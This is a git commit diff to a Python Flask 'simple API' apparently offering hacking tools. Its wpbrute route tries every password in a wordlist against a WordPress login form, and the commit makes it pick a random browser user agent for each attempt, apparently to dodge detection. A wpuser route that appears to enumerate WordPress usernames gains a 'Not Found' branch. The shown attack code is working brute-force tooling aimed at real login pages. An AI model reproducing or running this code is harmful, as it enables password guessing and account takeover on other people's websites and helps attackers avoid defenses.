a98a2b565bf9c247757c6d9978addec50bff10b4
AdliXSec <naufalsyahruradli@gmail.com>
2022-04-16 13:19:54 +0700

    simple API

--- main.py
+++ main.py
@@ -6,6 +6,22 @@ import json, random, hashlib, base64, string, socket
 
 app = Flask(__name__)
 
+ua = [
+    'Mozilla/5.0 (X11; CrOS x86_64 13310.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.108 Safari/537.36',
+    'Mozilla/5.0 (X11; CrOS x86_64 11895.118.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.159 Safari/537.36',
+    'Mozilla/5.0 (X11; CrOS x86_64 12239.92.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.136 Safari/537.36',
+    'Mozilla/5.0 (X11; CrOS x86_64 13099.110.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.136 Safari/537.36',
+    'Mozilla/5.0 (X11; CrOS x86_64 13099.102.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.127 Safari/537.36',
+    'Mozilla/5.0 (X11; CrOS x86_64 13020.87.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.119 Safari/537.36',
+    'Mozilla/5.0 (X11; CrOS x86_64 12871.102.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.141 Safari/537.36',
+    'Mozilla/5.0 (X11; CrOS x86_64 12499.66.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.106 Safari/537.36',
+    'Mozilla/5.0 (X11; CrOS x86_64 13310.59.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.84 Safari/537.36',
+    'Mozilla/5.0 (X11; CrOS x86_64 12739.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36',
+    'Mozilla/5.0 (X11; CrOS x86_64 12607.82.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.123 Safari/537.36',
+    'Mozilla/5.0 (X11; CrOS x86_64 13099.85.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.110 Safari/537.36',
+    'Mozilla/5.0 (X11; CrOS x86_64 12607.58.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.86 Safari/537.36'
+    ]
+
 @app.route("/", methods=['GET', 'POST'])
 def index():
     return render_template('index.html')
@@ -149,6 +165,11 @@ def wpuser():
                 "message": ipdata[0]['slug']
             }
             return data
+        else:
+            return {
+                "status": False,
+                "message": "Not Found"
+            }
     else:
         return {
             "status": 200,
@@ -412,8 +433,11 @@ def wpbrute():
             username = request.args.get('u')
             pw = open('mdpass.txt', 'r')
             for pwd in pw.read().splitlines():
+                usr_agent = {
+                    'User-Agent': random.choice(ua)
+                }
                 form = {"log":username, "pwd":pwd, "submit":"wp-submit"}
-                req = post(target, data=form)
+                req = post(target, data=form, headers=usr_agent)
                 w = req.text
                 if kondisi in w:
                     return {
